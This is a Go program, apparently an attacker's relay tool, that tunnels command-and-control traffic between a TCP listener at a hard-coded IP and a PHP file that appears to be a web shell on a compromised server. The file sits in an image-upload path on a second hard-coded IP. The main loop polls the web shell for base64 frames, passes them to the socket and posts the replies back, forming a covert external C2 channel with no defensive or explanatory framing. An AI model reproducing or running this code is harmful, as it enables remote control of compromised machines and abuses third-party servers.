package main

import (
	"encoding/base64"
	"encoding/binary"
	"log"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"
)

var isDebug bool = true

type SocketChannel struct {
	Socket net.Conn
	Debug  bool
}
type StagerInfo struct {
	osVersion string
	pipeName  string
	block     string
}

func (s *SocketChannel) ReadFrame() ([]byte, int, error) {
	sizeBytes := make([]byte, 4)
	if _, err := s.Socket.Read(sizeBytes); err != nil {
		return nil, 0, err
	}
	size := binary.LittleEndian.Uint32(sizeBytes)
	if size > 1024*1024 {
		size = 1024 * 1024
	}
	var total uint32
	buff := make([]byte, size)
	for total < size {
		read, err := s.Socket.Read(buff[total:])
		if err != nil {
			return nil, int(total), err
		}
		total += uint32(read)
	}
	if (size > 1 && size < 1024) && s.Debug {
		log.Printf("[+] Read frame: %s\n", base64.StdEncoding.EncodeToString(buff))
	}
	return buff, int(total), nil
}

func (s *SocketChannel) SendFrame(buffer []byte) (int, error) {
	length := len(buffer)
	if (length > 2 && length < 1024) && s.Debug {
		log.Printf("[+] Sending frame: %s\n", base64.StdEncoding.EncodeToString(buffer))
	}
	sizeBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(sizeBytes, uint32(length))
	if _, err := s.Socket.Write(sizeBytes); err != nil {
		return 0, err
	}
	x, err := s.Socket.Write(buffer)
	return x + 4, err
}

func getFile() ([]byte, error) {
	resp, err := http.Get(targeturl + "?r=1")
	r := make([]byte, 1024*1024)
	n, _ := resp.Body.Read(r)
	log.Println(string(r[:n]))
	rsp, err := base64.RawStdEncoding.DecodeString(string(r[:n]))
	return rsp, err
}

func putFile(data []byte) (*http.Response, error) {

	data = []byte(base64.RawStdEncoding.EncodeToString(data))
	d := url.QueryEscape(string(data))
	b := strings.NewReader("data=" + d)

	resp, err := http.Post(targeturl+"?w=1", "application/x-www-form-urlencoded", b)

	r := make([]byte, 1024*1024)

	n, err := resp.Body.Read(r)

	log.Println(string(r[:n]))

	return resp, err
}

var targeturl string

func main() {
	targeturl = "http://218.7.16.115:8089//Public/videoimg/20180514/web.php"
	conn, err := net.Dial("tcp", "42.51.204.15:2222")
	if err != nil {
		println(err.Error())
		return
	}
	c := &SocketChannel{conn, isDebug}
	for {
		time.Sleep(1e9)
		file, err := getFile()
		if err != nil {
			println(err.Error())
			return
		}
		if len(file) == 0 {
			continue
		}

		c.SendFrame(file)
		var t []byte
		var n int
		if len(file) > 2 && len(file) < 20 {
			t, n = []byte(nil), 0
		} else {
			t, n, err = c.ReadFrame()
		}
		if err != nil {
			println(err.Error())
			return
		}
		length := len(file)
		sizeBytes := make([]byte, 4)
		binary.LittleEndian.PutUint32(sizeBytes, uint32(length))
		putFile(append(sizeBytes, t[:n]...))

		if string(file) == "go" {
			time.Sleep(10e9)
		}
	}
}
